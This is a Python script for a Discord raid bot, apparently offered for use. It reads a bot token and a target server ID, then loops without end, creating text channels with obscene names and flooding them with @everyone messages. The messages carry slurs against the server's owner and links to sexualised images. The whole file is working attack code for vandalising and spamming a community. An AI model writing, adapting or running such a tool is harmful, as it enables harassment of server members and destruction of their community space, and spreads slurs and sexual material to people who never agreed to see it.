import discord
from discord.ext import commands
from asyncio import sleep
from discord.utils import get
from discord.ext import commands
import sys,time,os
from colorama import init
from termcolor import colored, cprint
from colorama import init
init()
from colorama import Fore, Back, Style
											#from colorama import init
											#init()													Для изменения цвета текста
											#from colorama import Fore, Back, Style
											#print(Fore.GREEN + 'зеленый текст')
											#print(Back.YELLOW + 'на желтом фоне')
											#print(Style.BRIGHT + 'стал ярче' + Style.RESET_ALL)
											#print('обычный текст')


bot = discord.Client()

message = colored('''
 (     (        )     *                   )     )            *     (     
 )\ )  )\ )  ( /(   (  `     (  (      ( /(  ( /(   (      (  `    )\ )  
(()/( (()/(  )\())  )\))(    )\))(   ' )\()) )\())  )\     )\))(  (()/(  
 /(_)) /(_))((_)\  ((_)()\  ((_)()\ ) ((_)\ ((_)\((((_)(  ((_)()\  /(_)) 
(_))_|(_))    ((_) (_()((_) _(())\_)() _((_)  ((_))\ _ )\ (_()((_)(_))   
| |_  | _ \  / _ \ |  \/  | \ \((_)/ /| || | / _ \(_)_\(_)|  \/  ||_ _|  
| __| |   / | (_) || |\/| |  \ \/\/ / | __ || (_) |/ _ \  | |\/| | | |   
|_|   |_|_\  \___/ |_|  |_|   \_/\_/  |_||_| \___//_/ \_\ |_|  |_||___|  
''', 'red')
def typewriter(message):
	for char in message:
		sys.stdout.write(char)
		sys.stdout.flush()

		if char !='\n':
			time.sleep(0.000001)
		else:
			time.sleep(0.000001)

os.system('cls') 
typewriter(message)
print(Fore.RED + '')

token =  input('TOKEN FROM BOT \nexploit@root:')
server = input('ID FROM SERVER \nexploit@root: ')

spamchan = []

@bot.event
async def SendPepe(ctx):
    await ctx.send("https://demotivation.ru/wp-content/uploads/2021/07/51-1.jpg")

@bot.event
async def on_ready():
	print('''//FUCK SERVER ACTIVATED//
                 .:                                           
                                    ~7  !^                                      
                                     7G~.YY.                                    
                             7!: :7^  ~B5~YB?.                                  
                        ~YYJJB&#GP&#GY!7##YY#B7.                                
                    :~!?J#&&&&&&&&&&&&&###&#G&&G7.                              
                    :5&&&#&&&#BGGGGGB#&&&&##&##&&BJ^                            
                  ^JG####&BJ~:.     .:~?P#&&#####&&#5^                          
                  :J&###&J.              :7P&&#####G##7                         
                 .?####&5                   ~P&&###G5B&Y.                       
                 !YP&##&?                     7B&&#&###&G^                      
                   P&##&G.                     .7P#&&&#&#~                      
                  ^G5###&G~                       :7P#&#&B?:                    
                  .. Y&&&&#5^                        ^J#&&&#5!                  
                     :57Y#&&&P7:                       ^B&&&&?                  
                         :75B&@#GJ~.                    Y&B5^                   
                            .~?PB&&#GJ!:               .!~.                     
                                .^7YG#&&BY!.                                    
                                     .~?P#&#Y^                                  
                                         .~YB&P^                                
                                            .!P&7                               
                                               !#7                              
                                                !B.                             
                                                 ?.                             
                                                                                
                                                                                
              ~J55557  .J5555!   .~Y55555~   .!Y5555^     ~Y5555~               
               !&&&@5 7B&&@B7.    .G&&&&&#^    5&&&@7      J@&&@?               
               ^&##&P5&&##J.      Y&##&&#&B:   J&##&7      7&##&7               
               ^####&&##&5       ?&###7G&#&G.  J&##&7      7&##&7               
               ^####&&&##&5:    7&##&G!Y&##&P  J&##&?      7&##&7               
               ^#&#&G~J&&#&B~  !#&#&&&&&&&##&5 J&##&BGGGGG57&##&7               
               ^###&Y  7B####7^B###G!^^~~5###&??&########&B7###&7               
                ::::.   .:::^:.^::^.      :::::.::::^^^::::.::::.                  
''')                                                                                 
	while True:
		sev = bot.get_guild(int(server))
		c = await sev.create_text_channel('СЕРВЕР-ХУЙНЯ')
		b = await sev.create_text_channel('SUCK-MY-DICK')
		w = await sev.create_text_channel('AVTOR-PIDORAS')
		h = await sev.create_text_channel('IDITE NAHUI')
		j = await sev.create_text_channel('EBAL-V-ROT')
		spamchan.append(c)
		spamchan.append(b)
		spamchan.append(w)
		spamchan.append(h)
		spamchan.append(j)
		for i in spamchan:
			await i.send('''@everyone KANAL HUYNYA I БЫЛ TRAHNUT WHOAMICASH
⠄⢸⣿⡟⠛⠛⠃⢸⣿⡇⠄⠄⣿⡇⠄⣼⣿⠟⠻⣿⣆⠄⣿⣿⢠⣾⣿⠋⠄⠄
⠄⢸⣿⣷⣶⣶⠄⢸⣿⡇⠄⠄⣿⡇⠄⣿⡏⠄⠄⠄⠄⠄⣿⣿⣿⣿⣇⠄⠄⠄
⠄⢸⣿⡇⠄⠄⠄⠘⣿⣧⣀⣰⣿⡇⠄⢿⣿⣀⣠⣿⡶⠄⣿⣿⠃⢹⣿⣆⠄⠄
⠄⠘⠛⠃⠄⠄⠄⠄⠘⠛⠛⠛⠋⠄⠄⠈⠛⠛⠛⠛⠁⠄⠛⠛⠄⠄⠛⠛⠃⠄
⠄⠄⠄⠄⢠⣤⡄⠄⠄⣤⣤⠄⢀⣠⣤⣄⡀⠄⢠⣤⡄⠄⠄⣤⣤⠄⠄⠄⠄⠄
⠄⠄⠄⠄⠄⢻⣿⣄⣼⣿⠃⣰⣿⠟⠛⢿⣿⡄⢸⣿⡇⠄⠄⣿⣿⠄⠄⠄⠄⠄
⠄⠄⠄⠄⠄⠄⠻⣿⡿⠁⠄⣿⣿⠄⠄⢸⣿⡇⢸⣿⡇⠄⠄⣿⣿⠄⠄⠄⠄⠄
⠄⠄⠄⠄⠄⠄⠄⣿⡇⠄⠄⠹⣿⣦⣤⣼⣿⠃⠄⣿⣷⣤⣴⣿⡏⠄⠄⠄⠄⠄
⠄⠄⠄⠄⠄⠄⠄⠛⠃⠄⠄⠄⠈⠛⠛⠋⠁⠄⠄⠈⠙⠛⠛⠉⠄⠄⠄⠄⠄⠄
⠄⠄⢀⣠⣤⣤⣄⡀⠄⣤⣤⠄⠄⣤⣤⠄⠄⠄⣤⣤⡄⠄⣤⣤⣤⣤⣤⣤⠄⠄
⠄⠄⣾⣿⠋⠙⠿⠗⠄⣿⣿⣀⣀⣿⣿⠄⠄⣸⣿⢿⣷⠄⠛⠛⣿⣿⠛⠛⠄⠄
⠄⠄⣿⣿⠄⠄⣀⠄⠄⣿⣿⠿⠿⣿⣿⠄⢠⣿⣏⣸⣿⡆⠄⠄⣿⣿⠄⠄⠄⠄
⠄⠄⠻⣿⣦⣴⣿⡟⠄⣿⣿⠄⠄⣿⣿⠄⣼⣿⠿⠿⢿⣿⡀⠄⣿⣿⠄⠄⠄⠄
⠄⠄⠄⠈⠉⠉⠉⠄⠄⠉⠉⠄⠄⠉⠉⠄⠉⠉⠄⠄⠈⠉⠁⠄⠉⠉⠄⠄⠄⠄
АВТОР-ЭТОГО СЕРВЕРА ПОЛНЫЙ ПИДОРАС
АВТОР-ЭТОГО СЕРВЕРА ПОЛНЫЙ ПИДОРАС
АВТОР-ЭТОГО СЕРВЕРА ПОЛНЫЙ ПИДОРАС
АВТОР-ЭТОГО СЕРВЕРА ПОЛНЫЙ ПИДОРАС
АВТОР-ЭТОГО СЕРВЕРА ПОЛНЫЙ ПИДОРАС
АВТОР-ЭТОГО СЕРВЕРА ПОЛНЫЙ ПИДОРАС
АВТОР-ЭТОГО СЕРВЕРА ПОЛНЫЙ ПИДОРАС
АВТОР-ЭТОГО СЕРВЕРА ПОЛНЫЙ ПИДОРАС
АВТОР-ЭТОГО СЕРВЕРА ПОЛНЫЙ ПИДОРАС
АВТОР-ЭТОГО СЕРВЕРА ПОЛНЫЙ ПИДОРАС
АВТОР-ЭТОГО СЕРВЕРА ПОЛНЫЙ ПИДОРАС
АВТОР-ЭТОГО СЕРВЕРА ПОЛНЫЙ ПИДОРАС
АВТОР-ЭТОГО СЕРВЕРА ПОЛНЫЙ ПИДОРАС
АВТОР-ЭТОГО СЕРВЕРА ПОЛНЫЙ ПИДОРАС
''')
		for i in spamchan:
			await i.send('''@everyone KANAL HUYNYA I БЫЛ TRAHNUT WHOAMICASH
https://www.wallpaperup.com/uploads/wallpapers/2015/01/07/577461/d237d873b7c6dfc0df8e7ac5fae6dbfd-1000.jpg
https://en.free-wallpapers.su/data/media/7/big/gl3976.jpg
https://ae01.alicdn.com/kf/HTB18opcNpXXXXbXXpXXq6xXFXXXo/Denise-Milani-Hot-Sexy-Bikini-Pechos-Grandes-Arte-Enorme-de-P-steres-TXHOME-D3815.jpg
https://en.free-wallpapers.su/data/media/7/big/gl10300.jpg
https://cdn.fishki.net/upload/post/2021/07/10/3833685/4ca45e3b88766cedd6042989a431fe34.jpg
https://i.ytimg.com/vi/QvGh2k58EaM/maxresdefault.jpg
https://i01.fotocdn.net/s117/127290cb5e070bfa/public_pin_l/2678491801.jpg
https://yobte.ru/uploads/posts/2020-05/razvratnye-devushki-v-posteli-69-foto-39.jpg
АВТОР-ЭТОГО СЕРВЕРА ПОЛНЫЙ ПИДОРАС
АВТОР-ЭТОГО СЕРВЕРА ПОЛНЫЙ ПИДОРАС
АВТОР-ЭТОГО СЕРВЕРА ПОЛНЫЙ ПИДОРАС
АВТОР-ЭТОГО СЕРВЕРА ПОЛНЫЙ ПИДОРАС

''')
		for i in spamchan:
			await i.send('''@everyone KANAL HUYNYA I БЫЛ TRAHNUT WHOAMICASH
https://yobte.ru/uploads/posts/2019-11/devki-v-bikini-62-foto-62.jpg
https://www.wallpaperup.com/uploads/wallpapers/2015/01/07/577461/d237d873b7c6dfc0df8e7ac5fae6dbfd-1000.jpg
https://en.free-wallpapers.su/data/media/7/big/gl3976.jpg
https://ae01.alicdn.com/kf/HTB18opcNpXXXXbXXpXXq6xXFXXXo/Denise-Milani-Hot-Sexy-Bikini-Pechos-Grandes-Arte-Enorme-de-P-steres-TXHOME-D3815.jpg
https://en.free-wallpapers.su/data/media/7/big/gl10300.jpg
https://cdn.fishki.net/upload/post/2021/07/10/3833685/4ca45e3b88766cedd6042989a431fe34.jpg
https://i.ytimg.com/vi/QvGh2k58EaM/maxresdefault.jpg
https://i01.fotocdn.net/s117/127290cb5e070bfa/public_pin_l/2678491801.jpg
https://yobte.ru/uploads/posts/2020-05/razvratnye-devushki-v-posteli-69-foto-39.jpg
АВТОР-ЭТОГО СЕРВЕРА ПОЛНЫЙ ПИДОРАС
АВТОР-ЭТОГО СЕРВЕРА ПОЛНЫЙ ПИДОРАС
АВТОР-ЭТОГО СЕРВЕРА ПОЛНЫЙ ПИДОРАС
АВТОР-ЭТОГО СЕРВЕРА ПОЛНЫЙ ПИДОРАС

''')				


bot.run(token)